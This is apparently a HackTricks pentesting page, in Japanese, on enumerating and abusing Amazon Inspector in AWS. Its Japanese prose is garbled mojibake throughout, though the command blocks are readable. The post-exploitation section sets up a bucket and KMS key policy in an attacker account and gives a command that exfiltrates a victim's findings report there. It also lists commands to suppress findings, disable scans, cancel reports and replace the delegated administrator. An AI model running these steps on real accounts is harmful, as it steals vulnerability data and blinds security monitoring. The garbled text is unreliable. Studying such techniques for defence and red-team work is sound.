Amazon Inspectorã¯ã€Amazon EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã‚’Center for Internet Securityï¼ˆCISï¼‰ã‹ã‚‰ã®ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹æ¨å¥¨ã«å¯¾ã—ã¦ãƒ™ãƒ³ãƒãƒãƒ¼ã‚¯ã™ã‚‹CISã‚¹ã‚­ãƒ£ãƒ³ã‚’å«ã¿ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¹ã‚­ãƒ£ãƒ³ã¯ã€æ§‹æˆãŒæ¥­ç•Œæ¨™æº–ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ™ãƒ¼ã‚¹ãƒ©ã‚¤ãƒ³ã«æº–æ‹ ã—ã¦ã„ã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚

* **Configuration**: CISã‚¹ã‚­ãƒ£ãƒ³ã¯ã€ã‚·ã‚¹ãƒ†ãƒ æ§‹æˆãŒç‰¹å®šã®CISãƒ™ãƒ³ãƒãƒãƒ¼ã‚¯æ¨å¥¨ã«åˆè‡´ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’è©•ä¾¡ã—ã€å„ãƒã‚§ãƒƒã‚¯ã¯CISãƒã‚§ãƒƒã‚¯IDãŠã‚ˆã³ã‚¿ã‚¤ãƒˆãƒ«ã«ãƒªãƒ³ã‚¯ã•ã‚Œã¦ã„ã¾ã™ã€‚
* **Execution**: ã‚¹ã‚­ãƒ£ãƒ³ã¯ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚¿ã‚°ãŠã‚ˆã³å®šç¾©ã•ã‚ŒãŸã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã«åŸºã¥ã„ã¦å®Ÿè¡Œã¾ãŸã¯ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚Œã¾ã™ã€‚
* **Results**: ã‚¹ã‚­ãƒ£ãƒ³å¾Œã®çµæœã¯ã€ã©ã®ãƒã‚§ãƒƒã‚¯ãŒåˆæ ¼ã€ã‚¹ã‚­ãƒƒãƒ—ã€ã¾ãŸã¯å¤±æ•—ã—ãŸã‹ã‚’ç¤ºã—ã€å„ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å§¿å‹¢ã«é–¢ã™ã‚‹æ´å¯Ÿã‚’æä¾›ã—ã¾ã™ã€‚

### Enumeration
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
### Post Exploitation

{% hint style="success" %}
æ”»æ’ƒè€…ã®è¦–ç‚¹ã‹ã‚‰è¦‹ã‚‹ã¨ã€ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã¯æ”»æ’ƒè€…ãŒä»–ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹/ã‚³ãƒ³ãƒ†ãƒŠã‚’ä¾µå®³ã™ã‚‹ã®ã«å½¹ç«‹ã¤è„†å¼±æ€§ã‚„ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®éœ²å‡ºã‚’è¦‹ã¤ã‘ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚

ã—ã‹ã—ã€æ”»æ’ƒè€…ã¯ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’å¦¨å®³ã—ã¦ã€è¢«å®³è€…ãŒè„†å¼±æ€§ï¼ˆã™ã¹ã¦ã¾ãŸã¯ç‰¹å®šã®ã‚‚ã®ï¼‰ã‚’ç¢ºèªã§ããªã„ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã«ã‚‚é–¢å¿ƒãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
{% endhint %}

#### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

æ”»æ’ƒè€…ã¯è„†å¼±æ€§ã‚„ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã®ææ–™è¡¨ï¼ˆSBOMï¼‰ã®è©³ç´°ãªãƒ¬ãƒãƒ¼ãƒˆã‚’ç”Ÿæˆã—ã€ãã‚Œã‚’ã‚ãªãŸã®AWSç’°å¢ƒã‹ã‚‰æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æƒ…å ±ã¯ã€ç‰¹å®šã®å¼±ç‚¹ã€å¤ã„ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã€ã¾ãŸã¯å®‰å…¨ã§ãªã„ä¾å­˜é–¢ä¿‚ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã€æ¨™çš„æ”»æ’ƒã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
1. **Amazon S3 ãƒã‚±ãƒƒãƒˆã‚’ä½œæˆ**ã—ã€è¢«å®³è€…ã® Amazon Inspector ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ãƒãƒªã‚·ãƒ¼ã‚’æ·»ä»˜ã—ã¾ã™:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Amazon KMSã‚­ãƒ¼ã‚’ä½œæˆ**ã—ã€è¢«å®³è€…ã®Amazon Inspectorã§ä½¿ç”¨ã§ãã‚‹ã‚ˆã†ã«ãƒãƒªã‚·ãƒ¼ã‚’ã‚¢ã‚¿ãƒƒãƒã—ã¾ã™:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. **èª¿æŸ»çµæœãƒ¬ãƒãƒ¼ãƒˆã‚’ä½œæˆã™ã‚‹** ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã€ãã‚Œã‚’å¤–éƒ¨ã«æŠ½å‡ºã—ã¾ã™:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
* **æ½œåœ¨çš„ãªå½±éŸ¿**: è©³ç´°ãªè„†å¼±æ€§ãŠã‚ˆã³ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãƒ¬ãƒãƒ¼ãƒˆã®ç”Ÿæˆã¨å¤–éƒ¨æµå‡ºã€ç‰¹å®šã®è„†å¼±æ€§ã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å¼±ç‚¹ã«é–¢ã™ã‚‹æ´å¯Ÿã‚’å¾—ã‚‹ã“ã¨ã€‚

#### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

æ”»æ’ƒè€…ã¯ã€æŒ‡å®šã•ã‚ŒãŸè„†å¼±æ€§ãƒ¬ãƒãƒ¼ãƒˆã¾ãŸã¯SBOMãƒ¬ãƒãƒ¼ãƒˆã®ç”Ÿæˆã‚’ã‚­ãƒ£ãƒ³ã‚»ãƒ«ã—ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒ¼ãƒ ãŒè„†å¼±æ€§ã‚„ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢éƒ¨å“è¡¨ï¼ˆSBOMï¼‰ã«é–¢ã™ã‚‹ã‚¿ã‚¤ãƒ ãƒªãƒ¼ãªæƒ…å ±ã‚’å—ã‘å–ã‚‹ã®ã‚’å¦¨ã’ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å•é¡Œã®æ¤œå‡ºã¨ä¿®æ­£ã‚’é…ã‚‰ã›ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
* **æ½œåœ¨çš„å½±éŸ¿**: ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£è¦–ã®ä¸­æ–­ã¨ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å•é¡Œã®è¿…é€Ÿãªæ¤œå‡ºã¨ä¿®æ­£ã®å¦¨å®³ã€‚

#### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€ã©ã®è„†å¼±æ€§ã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å•é¡ŒãŒå ±å‘Šã¾ãŸã¯æŠ‘åˆ¶ã•ã‚Œã‚‹ã‹ã‚’æ±ºå®šã™ã‚‹ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ãƒ«ãƒ¼ãƒ«ã‚’æ“ä½œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆ**action**ãŒSUPPRESSã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€æŠ‘åˆ¶ãƒ«ãƒ¼ãƒ«ãŒä½œæˆã•ã‚Œã¾ã™ï¼‰ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç®¡ç†è€…ã‹ã‚‰é‡è¦ãªè„†å¼±æ€§ãŒéš ã•ã‚Œã€æ¤œå‡ºã•ã‚Œãšã«ã“ã‚Œã‚‰ã®å¼±ç‚¹ã‚’æ‚ªç”¨ã—ã‚„ã™ããªã‚Šã¾ã™ã€‚é‡è¦ãªãƒ•ã‚£ãƒ«ã‚¿ã‚’å¤‰æ›´ã¾ãŸã¯å‰Šé™¤ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ç„¡é–¢ä¿‚ãªç™ºè¦‹ã§ã‚·ã‚¹ãƒ†ãƒ ã‚’æ´ªæ°´ã®ã‚ˆã†ã« inundate ã—ã€åŠ¹æœçš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£è¦–ã¨å¯¾å¿œã‚’å¦¨ã’ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
* **æ½œåœ¨çš„ãªå½±éŸ¿**: é‡è¦ãªè„†å¼±æ€§ã®éš è”½ã¾ãŸã¯æŠ‘åˆ¶ã€ã¾ãŸã¯ç„¡é–¢ä¿‚ãªç™ºè¦‹ã§ã‚·ã‚¹ãƒ†ãƒ ã‚’æ´ªæ°´ã•ã›ã‚‹ã“ã¨ã€‚

#### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

æ”»æ’ƒè€…ã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç®¡ç†æ§‹é€ ã‚’å¤§å¹…ã«æ··ä¹±ã•ã›ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

* å§”ä»»ã•ã‚ŒãŸç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒ¼ãƒ ãŒAmazon Inspectorã®è¨­å®šã‚„ãƒ¬ãƒãƒ¼ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ç®¡ç†ã™ã‚‹ã®ã‚’å¦¨ã’ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* ç„¡è¨±å¯ã®ç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’æœ‰åŠ¹ã«ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®šã‚’åˆ¶å¾¡ã—ã€ã‚¹ã‚­ãƒ£ãƒ³ã‚’ç„¡åŠ¹ã«ã—ãŸã‚Šã€æ‚ªæ„ã®ã‚ã‚‹æ´»å‹•ã‚’éš ã™ãŸã‚ã«è¨­å®šã‚’å¤‰æ›´ã—ãŸã‚Šã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

{% hint style="warning" %}
ç„¡è¨±å¯ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒå§”ä»»ã•ã‚ŒãŸç®¡ç†è€…ã«ãªã‚‹ãŸã‚ã«ã¯ã€è¢«å®³è€…ã¨åŒã˜çµ„ç¹”ã«æ‰€å±ã—ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ç„¡è¨±å¯ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒå§”ä»»ã•ã‚ŒãŸç®¡ç†è€…ã«ãªã‚‹ãŸã‚ã«ã¯ã€æ­£å½“ãªå§”ä»»ã•ã‚ŒãŸç®¡ç†è€…ãŒç„¡åŠ¹ã«ã•ã‚ŒãŸå¾Œã€ç„¡è¨±å¯ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒå§”ä»»ã•ã‚ŒãŸç®¡ç†è€…ã¨ã—ã¦æœ‰åŠ¹ã«ã•ã‚Œã‚‹å‰ã«ã€æ­£å½“ãªç®¡ç†è€…ãŒçµ„ç¹”ã‹ã‚‰å§”ä»»ã•ã‚ŒãŸç®¡ç†è€…ã¨ã—ã¦ç™»éŒ²è§£é™¤ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§å®Ÿè¡Œã§ãã¾ã™ï¼ˆ**`organizations:DeregisterDelegatedAdministrator`** æ¨©é™ãŒå¿…è¦ï¼‰ï¼š **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**
{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
* **æ½œåœ¨çš„ãªå½±éŸ¿**: ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç®¡ç†ã®ä¸­æ–­ã€‚

#### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

æ”»æ’ƒè€…ã¯ã€Amazon Inspector çµ„ç¹”å†…ã®ãƒ¡ãƒ³ãƒãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®é–¢é€£ä»˜ã‘ã‚’æ“ä½œã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ç„¡è¨±å¯ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’é–¢é€£ä»˜ã‘ãŸã‚Šã€æ­£å½“ãªã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’é–¢é€£ä»˜ã‘è§£é™¤ã—ãŸã‚Šã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ã©ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¹ã‚­ãƒ£ãƒ³ã‚„å ±å‘Šã«å«ã¾ã‚Œã‚‹ã‹ã‚’åˆ¶å¾¡ã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€é‡è¦ãªã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£è¦–ã‹ã‚‰é™¤å¤–ã•ã‚Œã€æ”»æ’ƒè€…ãŒãã‚Œã‚‰ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®è„†å¼±æ€§ã‚’æ¤œå‡ºã•ã‚Œãšã«æ‚ªç”¨ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

{% hint style="warning" %}
ã“ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€å§”ä»»ã•ã‚ŒãŸç®¡ç†è€…ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
* **æ½œåœ¨çš„å½±éŸ¿**: ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¹ã‚­ãƒ£ãƒ³ã‹ã‚‰ã®é‡è¦ãªã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®é™¤å¤–ã«ã‚ˆã‚Šã€è„†å¼±æ€§ã®æœªæ¤œå‡ºã®æ‚ªç”¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

#### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

`inspector2:Disable` æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€æŒ‡å®šã•ã‚ŒãŸã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«å¯¾ã—ã¦ç‰¹å®šã®ãƒªã‚½ãƒ¼ã‚¹ã‚¿ã‚¤ãƒ—ï¼ˆEC2ã€ECRã€Lambdaã€Lambdaã‚³ãƒ¼ãƒ‰ï¼‰ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¹ã‚­ãƒ£ãƒ³ã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ãŒã§ãã€AWSç’°å¢ƒã®ä¸€éƒ¨ãŒç›£è¦–ã•ã‚Œãšã€æ”»æ’ƒã«å¯¾ã—ã¦è„†å¼±ã«ãªã‚Šã¾ã™ã€‚ã•ã‚‰ã«ã€**`inspector2:Enable`** ãŠã‚ˆã³ **`iam:CreateServiceLinkedRole`** æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€ç–‘ã‚ã—ã„æ§‹æˆã®æ¤œå‡ºã‚’é¿ã‘ã‚‹ãŸã‚ã«ã€ã‚¹ã‚­ãƒ£ãƒ³ã‚’é¸æŠçš„ã«å†æœ‰åŠ¹åŒ–ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% hint style="warning" %}
ã“ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€å§”ä»»ã•ã‚ŒãŸç®¡ç†è€…ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
* **æ½œåœ¨çš„ãªå½±éŸ¿**: ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£è¦–ã«ãŠã‘ã‚‹ç›²ç‚¹ã®ä½œæˆã€‚

#### `inspector2:UpdateOrganizationConfiguration`

ã“ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€ã‚ãªãŸã®Amazon Inspectorçµ„ç¹”ã®è¨­å®šã‚’æ›´æ–°ã§ãã€æ–°ã—ã„ãƒ¡ãƒ³ãƒãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«å¯¾ã—ã¦æœ‰åŠ¹ãªãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚¹ã‚­ãƒ£ãƒ³æ©Ÿèƒ½ã«å½±éŸ¿ã‚’ä¸ãˆã¾ã™ã€‚

{% hint style="warning" %}
ã“ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€å§”ä»»ã•ã‚ŒãŸç®¡ç†è€…ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
* **æ½œåœ¨çš„ãªå½±éŸ¿**: çµ„ç¹”ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¹ã‚­ãƒ£ãƒ³ãƒãƒªã‚·ãƒ¼ã¨è¨­å®šã‚’å¤‰æ›´ã™ã‚‹ã€‚

#### `inspector2:TagResource`, `inspector2:UntagResource`

æ”»æ’ƒè€…ã¯ã€AWS Inspectorãƒªã‚½ãƒ¼ã‚¹ã®ã‚¿ã‚°ã‚’æ“ä½œã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¿ã‚°ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è©•ä¾¡ã®æ•´ç†ã€è¿½è·¡ã€è‡ªå‹•åŒ–ã«ã¨ã£ã¦é‡è¦ã§ã™ã€‚ã‚¿ã‚°ã‚’å¤‰æ›´ã¾ãŸã¯å‰Šé™¤ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¹ã‚­ãƒ£ãƒ³ã‹ã‚‰è„†å¼±æ€§ã‚’éš ã—ã€ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹å ±å‘Šã‚’å¦¨å®³ã—ã€è‡ªå‹•ä¿®å¾©ãƒ—ãƒ­ã‚»ã‚¹ã«å¹²æ¸‰ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€çµæœã¨ã—ã¦æœªãƒã‚§ãƒƒã‚¯ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å•é¡Œã‚„ã‚·ã‚¹ãƒ†ãƒ ã®æ•´åˆæ€§ã®ä¾µå®³ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
* **æ½œåœ¨çš„å½±éŸ¿**: è„†å¼±æ€§ã®éš è”½ã€ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹å ±å‘Šã®ä¸­æ–­ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è‡ªå‹•åŒ–ã®ä¸­æ–­ã€ã‚³ã‚¹ãƒˆé…åˆ†ã®ä¸­æ–­ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
* [https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

